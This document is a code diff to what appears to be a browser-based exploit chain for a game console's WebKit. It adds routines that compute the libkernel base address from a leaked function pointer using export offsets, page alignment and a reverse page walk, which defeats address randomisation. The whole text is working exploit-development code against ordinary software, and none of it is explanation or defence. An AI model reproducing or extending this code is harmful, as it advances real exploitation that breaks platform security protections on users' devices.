@@ -421,21 +421,77 @@ function extEntryCodeNum(entry) {
     return Number.isFinite(n) ? (n >>> 0) : null;
 }
 
+/** Max 16KB pages to walk back from fn when reverse-matching export RVAs (0 reads). */
+const LK_PAGE_WALK_MAX = 48;
+
+function pushLkZeroRead(out, seen, lk, row, via, priBump, off) {
+    if (!looksLikeLkBase(lk, off)) return false;
+    const k = String(lk);
+    if (seen.has(k)) return false;
+    seen.add(k);
+    out.push({
+        lk,
+        rva: row.rva,
+        key: row.key,
+        via: via,
+        pri: row.pri + (priBump != null ? priBump : 0),
+    });
+    return true;
+}
+
 function lkRvaAttempts(fnPtr, off) {
-    const table = libkernelRvaTable(off);
-    const out = [];
-    for (let i = 0; i < table.length; i++) {
-        const row = table[i];
-        const lk = fnPtr.sub32(row.rva);
-        out.push({
-            key: row.key,
-            rva: row.rva,
-            lk: String(lk),
-            aligned: lkAligned(lk),
-            ok: looksLikeLkBase(lk, off),
+    const hits = calcLkFromFnPtrZeroRead(fnPtr, off);
+    if (hits.length) {
+        return hits.slice(0, 6).map(function (h) {
+            return {
+                key: h.key,
+                rva: h.rva,
+                lk: String(h.lk),
+                aligned: true,
+                ok: true,
+                via: h.via,
+            };
         });
     }
-    return out;
+    const table = libkernelRvaTable(off);
+    const out = [];
+    const fnB = ptrBig(fnPtr);
+    for (let i = 0; i < table.length && i < 4; i++) {
+        const row = table[i];
+        const raw = fnPtr.sub32(row.rva);
+        const pg = pageAlignDown(raw, 0x4000);
+        out.push({
+            key: row.key + "/raw",
+            rva: row.rva,
+            lk: String(raw),
+            aligned: lkAligned(raw),
+            ok: false,
+            via: "fn−rva",
+        });
+        out.push({
+            key: row.key + "/+page",
+            rva: row.rva,
+            lk: String(pg),
+            aligned: lkAligned(pg),
+            ok: false,
+            via: "page(fn−rva)",
+        });
+    }
+    let page = pageAlignDown(fnPtr, 0x4000);
+    for (let step = 0; step < 8; step++) {
+        if (!userlandPtrOk(page)) break;
+        const delta = Number(fnB - ptrBig(page));
+        out.push({
+            key: "rev@-" + (step * 0x4000).toString(16),
+            rva: delta,
+            lk: String(page),
+            aligned: lkAligned(page),
+            ok: false,
+            via: "Δ=0x" + delta.toString(16),
+        });
+        page = page.sub32(0x4000);
+    }
+    return out.slice(0, 8);
 }
 
 function lkLoSuffix(lk) {
@@ -509,7 +565,8 @@ export function formatExtPtrDiagLine(d) {
     if (!d.matches.length) {
         if (d.near && d.near.length) {
             const bits = d.near.map(function (m) {
-                return m.key + "→0x" + m.lk + (m.ok ? " OK" : (m.aligned ? " align" : " off"));
+                const tag = m.via ? m.via + " " : "";
+                return m.key + "→0x" + m.lk + (m.ok ? " OK" : (" " + tag + (m.aligned ? "align" : "off")));
             });
             return d.label + " fn=0x" + d.hex + " — " + bits.join(" ");
         }
@@ -2477,29 +2534,43 @@ function looksLikeLkBase(lk, off) {
 }
 
 /**
- * lk = fnPtr − RVA — pure math, 0 reads.
- * Keeps candidates that are 16KB-aligned (WebKit libkernel_sys mapping).
+ * lk from ext fn ptr — 0 reads. 13.52 imports rarely satisfy raw fn−RVA alignment;
+ * also tries page-align(fn−RVA) and page-walk reverse Δ match (PSFree style).
  */
 export function calcLkFromFnPtrZeroRead(fnPtr, off) {
     if (!userlandPtrOk(fnPtr)) return [];
+    off = off || {};
     const table = libkernelRvaTable(off);
     const out = [];
     const seen = new Set();
+    const fnB = ptrBig(fnPtr);
+
     for (let i = 0; i < table.length; i++) {
         const row = table[i];
-        const lk = fnPtr.sub32(row.rva);
-        if (!looksLikeLkBase(lk, off)) continue;
-        const k = String(lk);
-        if (seen.has(k)) continue;
-        seen.add(k);
-        out.push({
-            lk,
-            rva: row.rva,
-            key: row.key,
-            via: "rva-" + row.key,
-            pri: row.pri,
-        });
+        const raw = fnPtr.sub32(row.rva);
+        pushLkZeroRead(out, seen, raw, row, "rva-" + row.key, 0, off);
+        const pg = pageAlignDown(raw, 0x4000);
+        if (String(pg) !== String(raw))
+            pushLkZeroRead(out, seen, pg, row, "rva-" + row.key + "+page", 1, off);
     }
+
+    let page = pageAlignDown(fnPtr, 0x4000);
+    for (let step = 0; step < LK_PAGE_WALK_MAX; step++) {
+        if (!userlandPtrOk(page) || !lkAligned(page)) break;
+        const delta = Number(fnB - ptrBig(page));
+        if (delta > 0 && delta < 0x500000) {
+            for (let ti = 0; ti < table.length; ti++) {
+                const row = table[ti];
+                if (row.rva === delta) {
+                    pushLkZeroRead(out, seen, page, row, "rev-" + row.key, 0, off);
+                } else if (Math.abs(row.rva - delta) <= 0x3f) {
+                    pushLkZeroRead(out, seen, page, row, "rev~" + row.key, 3, off);
+                }
+            }
+        }
+        page = page.sub32(0x4000);
+    }
+
     out.sort(function (a, b) { return a.pri - b.pri; });
     return out;
 }
@@ -2550,24 +2621,33 @@ export function resolveLkOnePltStep(p, webkitBase, off, opts) {
         };
     }
     if (off.k_usleep != null) {
-        const lkUs = fn.sub32(off.k_usleep);
-        if (looksLikeLkBase(lkUs, off))
+        const hits = calcLkFromFnPtrZeroRead(fn, off);
+        if (hits.length) {
             return {
-                ok: true, lk: lkUs, pltRva, idx, total: cands.length,
-                fnPtr: fn, via: "usleep-" + off.k_usleep.toString(16),
+                ok: true, lk: hits[0].lk, pltRva, idx, total: cands.length,
+                fnPtr: fn, via: hits[0].via,
+            };
+        }
+        const lkUs = fn.sub32(off.k_usleep);
+        const lkUsPg = pageAlignDown(lkUs, 0x4000);
+        if (looksLikeLkBase(lkUsPg, off))
+            return {
+                ok: true, lk: lkUsPg, pltRva, idx, total: cands.length,
+                fnPtr: fn, via: "usleep-page-" + off.k_usleep.toString(16),
             };
     }
     if (off.k__error != null) {
         const lk = fn.sub32(off.k__error);
-        if (looksLikeLkBase(lk, off))
+        const lkPg = pageAlignDown(lk, 0x4000);
+        if (looksLikeLkBase(lkPg, off))
             return {
-                ok: true, lk, pltRva, idx, total: cands.length,
-                fnPtr: fn, via: "error-" + off.k__error.toString(16),
+                ok: true, lk: lkPg, pltRva, idx, total: cands.length,
+                fnPtr: fn, via: "error-page-" + off.k__error.toString(16),
             };
     }
     return {
         ok: false, pltRva, idx, total: cands.length,
-        fnPtr: fn, error: "fn−RVA miss (not 16KB-aligned lk)",
+        fnPtr: fn, error: "fn−RVA miss (try rev walk / not libkernel import)",
     };
 }
 
